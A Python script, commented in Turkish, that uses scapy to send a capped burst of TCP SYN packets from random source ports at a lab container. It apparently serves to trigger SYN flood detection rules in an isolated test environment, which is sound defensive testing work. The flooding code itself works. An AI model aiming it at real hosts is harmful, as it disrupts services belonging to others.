"""SYN Flood Simulasyonu (Issue #8)
=====================================
Izole test lab'inda `target` konteynerine karsi, ACK'siz TCP SYN
paketlerini rastgele kaynak portlardan hizlica gondererek bir SYN flood
paternini simule eder.

ONEMLI: Bu script SADECE izole test lab agi (testenv/) icindir. Gonderilen
paket sayisi kasitli olarak sinirlandirilmistir (bkz. MAX_COUNT) -- amac
gercek bir DoS saldirisi uretmek degil, tespit tarafinin (rules-engine/
dashboard) SYN flood paternini taniyabilmesi icin kisa sureli, kontrollu
bir tetikleyici uretmektir.

Kullanim (attacker konteyneri icinde, kok yetkisi gerekir):
    python3 simulate/syn_flood.py --target target --port 22 --count 500
"""

from __future__ import annotations

import argparse
import random

# Izole lab disinda kullanimi / gercek bir DoS'a donusmesini engellemek
# icin sabit bir ust sinir.
MAX_COUNT = 5000


def run_syn_flood(target: str, port: int, count: int = 500) -> int:
    """count kadar sahte kaynak portlu TCP SYN paketi gonderir, gonderilen paket sayisini dondurur."""
    if count > MAX_COUNT:
        raise ValueError(
            f"count {MAX_COUNT} degerini asamaz (izole lab disi kullanimi/gercek DoS'u onlemek icin)"
        )

    from scapy.all import IP, TCP, send  # lazy import: sadece calisirken gerekli

    for _ in range(count):
        src_port = random.randint(1024, 65535)
        pkt = IP(dst=target) / TCP(sport=src_port, dport=port, flags="S")
        send(pkt, verbose=False)

    return count


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Izole test lab'inda SYN flood simulasyonu")
    parser.add_argument("--target", required=True, help="Hedef host/IP (ornek: target)")
    parser.add_argument("--port", type=int, default=22, help="Hedef port")
    parser.add_argument(
        "--count", type=int, default=500, help=f"Gonderilecek SYN paketi sayisi (en fazla {MAX_COUNT})"
    )
    args = parser.parse_args()

    sent = run_syn_flood(args.target, args.port, args.count)
    print(f"{sent} adet SYN paketi gonderildi (hedef: {args.target}:{args.port})")
